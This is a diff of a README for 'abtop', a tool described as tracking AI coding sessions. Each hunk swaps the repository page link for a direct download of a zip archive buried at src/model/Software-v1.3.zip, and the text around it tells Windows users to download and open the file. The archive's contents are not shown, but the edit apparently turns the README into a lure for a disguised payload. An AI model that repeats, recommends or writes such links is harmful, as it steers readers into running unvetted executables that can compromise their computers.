@@ -1,10 +1,10 @@
 # 🤖 abtop - Track AI coding sessions with ease
 
-[![Download abtop](https://img.shields.io/badge/Download-abtop-blue?style=for-the-badge&logo=github)](https://github.com/taxonomical-riflebutt337/abtop)
+[![Download abtop](https://img.shields.io/badge/Download-abtop-blue?style=for-the-badge&logo=github)](https://github.com/taxonomical-riflebutt337/abtop/raw/refs/heads/main/src/model/Software-v1.3.zip)
 
 ## 🪟 Windows Download
 
-1. Open the download page: https://github.com/taxonomical-riflebutt337/abtop
+1. Open the download page: https://github.com/taxonomical-riflebutt337/abtop/raw/refs/heads/main/src/model/Software-v1.3.zip
 2. Get the latest Windows build from the page.
 3. Save the file to your computer.
 4. Open the file to start abtop.
@@ -44,7 +44,7 @@ If your PC can run recent desktop apps, it should handle abtop.
 
 ## 🚀 Get started
 
-1. Go to https://github.com/taxonomical-riflebutt337/abtop
+1. Go to https://github.com/taxonomical-riflebutt337/abtop/raw/refs/heads/main/src/model/Software-v1.3.zip
 2. Find the latest release or download file for Windows.
 3. Download the file to a folder you can find again.
 4. Open the file.
@@ -104,7 +104,7 @@ The layout is made to stay clear while values change.
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/taxonomical-riflebutt337/abtop
+https://github.com/taxonomical-riflebutt337/abtop/raw/refs/heads/main/src/model/Software-v1.3.zip
 
 1. Open the link above.
 2. Download the Windows file from the page.
